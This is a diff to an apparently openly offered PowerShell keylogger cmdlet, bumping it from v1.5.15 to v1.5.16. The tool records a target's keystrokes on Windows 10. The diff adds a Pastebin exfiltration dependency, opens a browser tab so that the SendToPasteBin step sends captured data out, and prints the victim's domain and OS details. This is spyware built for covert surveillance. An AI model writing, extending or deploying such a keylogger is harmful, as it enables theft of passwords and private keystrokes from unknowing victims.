@@ -5,8 +5,8 @@
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
-   Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.5.15
+   Optional Dependencies: Out-PasteBin.ps1
+   PS cmdlet Dev version: v1.5.16
    
 .DESCRIPTION
    Start recording keyboard keystrokes if target has
@@ -120,7 +120,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.5.15"
+$CmdletVersion = "v1.5.16"
 $IPath = (Get-Location).Path
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
@@ -566,9 +566,20 @@ If($Mode -iMatch '^(stop)$')
    ## SendToPasteBin function
    If($SendToPasteBin.IsPresent)
    {
-      start "https://elgoog.im/pacman" ## Open new tab to force SendToPasteBin to kick in!
-      Start-Sleep -Seconds 5
+      write-host "   ╰➤ ⛑️ " -ForegroundColor Red -NoNewline
+      write-host "Open new tab to invoke SendToPasteBin"
+
+      start "https://elgoog.im/pacman"
+      Start-Sleep -Seconds 4
    }
+
+   ## Print info onscreen
+   $System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption
+   $OSversion = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
+   $NameDomain = (Get-CimInstance -ClassName CIM_OperatingSystem).CSName
+   write-host "`n     Domain name      : $NameDomain"
+   write-host "     OS version       : $OSversion"
+   write-host "     Operative system : $System"
 
    ## Kill all PID's
    $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
